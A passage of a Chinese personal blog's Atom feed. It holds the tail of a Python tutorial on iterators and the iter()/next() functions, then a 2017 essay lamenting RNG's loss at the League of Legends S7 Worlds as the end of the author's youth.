class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>实际上完全等价于：<br>首先获得Iterator对象:<br>    it = iter([1, 2, 3, 4, 5])<br>循环:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># 获得下一个值:</span></span><br><span class="line">x = next(it)</span><br><span class="line"><span class="keyword">except</span> StopIteration:</span><br><span class="line"><span class="comment"># 遇到StopIteration就退出循环</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>凡是可作用于for循环的对象都是Iterable类型；<br>凡是可作用于next()函数的对象都是Iterator类型，它们表示一个惰性计算的序列；<br>集合数据类型如list、dict、str等是Iterable但不是Iterator，不过可以通过iter()函数获得一个Iterator对象。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;切片&quot;&gt;&lt;a href=&quot;#切片&quot; class=&quot;headerlink&quot; title=&quot;切片&quot;&gt;&lt;/a&gt;切片&lt;/h1&gt;&lt;p&gt;取list或者tuple的部分元素&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纪念我逝去的青春</title>
    <link href="https://www.twosmi1e.com/2017/10/28/%E7%BA%AA%E5%BF%B5%E6%88%91%E9%80%9D%E5%8E%BB%E7%9A%84%E9%9D%92%E6%98%A5/"/>
    <id>https://www.twosmi1e.com/2017/10/28/纪念我逝去的青春/</id>
    <published>2017-10-28T15:14:35.000Z</published>
    <updated>2018-08-02T16:24:10.402Z</updated>
    
    <content type="html"><![CDATA[<p>  &nbsp;&nbsp;当第五局开场Sliver&nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。<br>  &nbsp;&nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来两个人死在一起的时候，真的心中一凉，原来真的 青春不一定会圆满啊。</p><p>  &nbsp;&nbsp;这个BO5，看到了小狗的vn，看到了letme的纳尔，看到了虎九万的飞机，看到了香锅两把MVP的表现，真的足够了，唯一遗憾的就是没能打败SKT<br>晋级总决赛吧。</p><p>  &nbsp;&nbsp;从S2到S7，五年了，初中时刚刚知晓英雄联盟，和同学一起去黑网吧打人机还打的津津有味。高中那时进一个网吧清一色的英雄联盟，中午觉都不睡去打一把就是为了拿首胜买英雄，逃晚自习逃课和同学一起出去双排，最开心的事情就是和一群兄弟一起去网吧五黑，那时的微笑，草莓，若风，那时的WE，都是回忆啊。今年可以说是LPL最有希望的一年，是RNG最有希望的一年，在家门口打比赛，所有玩过英雄联盟的人都在关注着，为LPL加油，这也是ADC强势的版本，小狗状态也很好，天时地利人和，真的希望RNG全华班能夺冠，买上一个冠军皮肤，然后打上两把告别召唤师峡谷。当初一起玩LOL的人都已经陆续离开了，守望先锋，绝地求生，或是不玩游戏了，毕竟都已经长大了，据说S8还要改符文系统，我已经没有那么多精力再去适应新版本再去玩游戏了吧，所以可能S7就是最后一次追这赛事了吧，和LPL一起逝去的，是那些回忆那些青春啊！<br>  &nbsp;&nbsp;ROYAL NERVER GIVE UP！今天RNG是站着死的，不想喷任何人，也不想他们被喷，在我心中香锅就是世界第一打野，世界上只有一个VN叫uzi，谁说LPL只有蓝领型上单我们有letme，ming的凤女洛都曾带来精彩的表演，还有单杀faker的虎将军，你们，真的已经很棒了。<br>  &nbsp;&nbsp;曾在比赛之前想，如果S7LPL夺冠了，会带来什么？英雄联盟又能多火几年。但这对于我来说，对于我们这些从S1，S2开始的老玩家来说，这是一次青春的完美谢幕，为我那曾经逃课上网的网瘾少年的时光，画上一个圆满的句号。可是不如意事常八九，不可能总是事事圆满。<br>  &nbsp;&nbsp;传奇还在继续，Legend&nbsp;never&nbsp;die，希望LPL不要放弃</p><p>  &nbsp;&nbsp;今夜再矫情一次，再中二一次，再难过地哭一次，为与胜利失之交臂的RNG，也为我逝去的青春。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  &amp;nbsp;&amp;nbsp;当第五局开场Sliver&amp;nbsp;Scrapes响起的时候，我已经想到了RNG赢下比赛去往鸟巢的场景，我还以为所有那五个满身热血的少年最后能成功饮血屠龙。&lt;br&gt;  &amp;nbsp;&amp;nbsp;看到最后只剩两个人，小狗被追上高地letme最后冲过来
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://www.twosmi1e.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
